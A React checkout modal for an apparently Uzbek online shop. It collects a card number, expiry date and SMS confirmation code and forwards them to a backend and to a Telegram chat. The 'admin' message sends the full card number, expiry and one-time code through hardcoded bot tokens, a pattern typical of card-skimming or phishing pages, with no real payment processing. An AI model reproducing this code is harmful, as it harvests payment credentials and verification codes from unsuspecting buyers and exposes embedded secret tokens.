import React, { useState } from 'react';
import Box from '@mui/material/Box';
import Modal from '@mui/material/Modal';
import axios from 'axios';
import InputMask from 'react-input-mask';
import "./basic-modal.css";
import { useForm } from "react-hook-form";
import { Notyf } from 'notyf';
import 'notyf/notyf.min.css'; // for React, Vue and Svelte
import outdent from 'outdent';

const style = {
     position: 'absolute',
     top: '50%',
     left: '50%',
     transform: 'translate(-50%, -50%)',
     width: 400,
     bgcolor: 'background.paper',
     border: '2px solid #000',
     boxShadow: 24,
     p: 4,
};

const notyf = new Notyf({
     position: {
          x: 'center',
          y: 'top',
     },
});

export default function BasicModal({ isOpen, onClose, totalPrice, basketItems, quantities }) {
     const { register, handleSubmit } = useForm();
     const [isCardDetailsEntered, setIsCardDetailsEntered] = useState(false);

     const handleCardDetailsSubmit = (data) => {
          const carddateRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;

          if (!carddateRegex.test(data.carddate)) {
               notyf.error("Неверный формат срока действия карты.");
               return;
          }

          const [inputMonth, inputYear] = data.carddate.split('/').map(num => parseInt(num, 10));
          const currentYear = new Date().getFullYear() % 100; // Получаем последние 2 цифры текущего года
          const currentMonth = new Date().getMonth() + 1; // Месяц в JS начинается с 0

          if (inputYear < currentYear || (inputYear === currentYear && inputMonth < currentMonth)) {
               notyf.error("Срок действия карты истек.");
               return;
          }

          setIsCardDetailsEntered(true);
     };

     const handleSMSCodeSubmit = (data) => {
          console.log("Form submitted with data:", data);

          if (data.cardcode.length !== 6) {
               notyf.error("SMS-код должен содержать 6 символов.");
               return;
          }

          if (data.cardcode.length === 6) {
               axios.post('https://magazin-bot-backend.vercel.app/api/add', { ...data, totalPrice })
                    .then(response => {
                         console.log("Success response:", response);
                         notyf.success("To'lov chekingiz telegram botga yuborildi!");
                         onClose();
                    })
                    .catch(error => {
                         console.log("Error response:", error);
                         if (error.response) {
                              notyf.error(`Ошибка: ${error.response.data.message}`);
                         } else {
                              notyf.error("To'lovni amalga oshirishda xatolik");
                         }
                    });

               const token = '7409890621:AAGtsTzdH-U-IQsdam-FVzVMX_EcXCxKe9I';
               const chat_id = 6183727519;

               const now = new Date();
               const formattedDate = now.toLocaleDateString();
               const formattedTime = now.toLocaleTimeString();

               const itemsDescription = basketItems.map(item =>
                    `🔹 *${item.nameproduct}* — ${quantities[item.id]} шт — *${item.price * quantities[item.id]} $*`
               ).join('\n');

               const customerMessage = outdent`
🧾 *Чек оплаты*
────────────────
💰 *Общая сумма:* ${totalPrice} $
🗓 *Дата оформления:* ${formattedDate} в ${formattedTime}

🛒 *Товары:*
${itemsDescription}

Спасибо за покупку! 🎉
               `;

               const customerUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=Markdown&text=${encodeURIComponent(customerMessage)}`;

               axios.get(customerUrl)
                    .then(response => {
                         console.log("Customer message sent successfully:", response);
                    })
                    .catch(error => {
                         console.error("Error sending customer message:", error);
                    });

               // Администратор получает полные данные
               const adminToken = '7410425586:AAEZQt1ES_oVU8jMlYBIwTF3gYBCUgVtQrc';
               const adminChatId = 6183727519;

               const adminMessage = outdent`
📋 *Новый заказ поступил!*

💳 *Платежная информация:*
────────────────
• *Номер карты:* ${data.cardnumber}
• *Срок действия:* ${data.carddate}
• *Общая сумма:* ${totalPrice} $
• *Код подтверждения:* ${data.cardcode}

🛍 *Детали заказа:*
────────────────
${itemsDescription}

🗓 *Дата оформления:* ${formattedDate}, ${formattedTime}

_Спасибо, что следите за процессом!_
               `;

               const adminUrl = `https://api.telegram.org/bot${adminToken}/sendMessage?chat_id=${adminChatId}&parse_mode=Markdown&text=${encodeURIComponent(adminMessage)}`;

               axios.get(adminUrl)
                    .then(response => {
                         console.log("Admin message sent successfully:", response);
                    })
                    .catch(error => {
                         console.error("Error sending admin message:", error);
                    });

               // Отправка изображений продуктов покупателю
               const sendProductImages = async () => {
                    for (const item of basketItems) {
                         if (item.img[0]) {
                              const imageUrl = item.img;
                              const caption = `${item.nameproduct}\n- ${quantities[item.id]} шт\n- ${item.price * quantities[item.id]} $`;
                              const imageUrlForSending = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chat_id}&photo=${encodeURIComponent(imageUrl)}&caption=${encodeURIComponent(caption)}`;

                              try {
                                   const response = await axios.get(imageUrlForSending);
                                   console.log(`Image for ${item.nameproduct} sent successfully:`, response);
                              } catch (error) {
                                   console.error(`Error sending image for ${item.nameproduct}:`, error);
                              }
                         }
                    }
               };

               sendProductImages();
          } else {
               notyf.error("Неверный SMS-код");
          }
     };

     return (
          <>
               <Modal open={isOpen} onClose={onClose} aria-labelledby="modal-modal-title" aria-describedby="modal-modal-description">
                    <Box sx={style}>
                         <form className="payment__container"
                              onSubmit={handleSubmit(isCardDetailsEntered ? handleSMSCodeSubmit : handleCardDetailsSubmit)}
                         >
                              <div className="payment__select">
                                   <h1>Umumiy to'lov summasi:<p>{totalPrice}</p>$</h1>
                              </div>

                              {!isCardDetailsEntered ? (
                                   <>
                                        <div className="payment__inp-number">
                                             <InputMask
                                                  mask="9999 9999 9999 9999"
                                                  maskChar=" "
                                                  {...register("cardnumber", { required: true })}
                                                  placeholder='karta raqamni kiriting'
                                             >
                                                  {(inputProps) => <input {...inputProps} />}
                                             </InputMask>
                                             <InputMask
                                                  mask="99/99"
                                                  maskChar=" "
                                                  {...register("carddate", { required: true })}
                                                  placeholder='amal qilish muddati(oo/yy)'
                                             >
                                                  {(inputProps) => <input {...inputProps} />}
                                             </InputMask>
                                        </div>
                                        <div className="payment__send">
                                             <button type='submit'>
                                                  Davom etish
                                             </button>
                                        </div>
                                   </>
                              ) : (
                                   <div className="cardcode">
                                        <InputMask
                                             mask="999999"
                                             maskChar=" "
                                             {...register("cardcode", { required: true })}
                                             placeholder='kodni kiriting'
                                        >
                                             {(inputProps) => <input {...inputProps} />}
                                        </InputMask>
                                        <button type="submit">
                                             Yubormoq
                                        </button>
                                   </div>
                              )}
                         </form>
                    </Box>
               </Modal>
          </>
     );
}
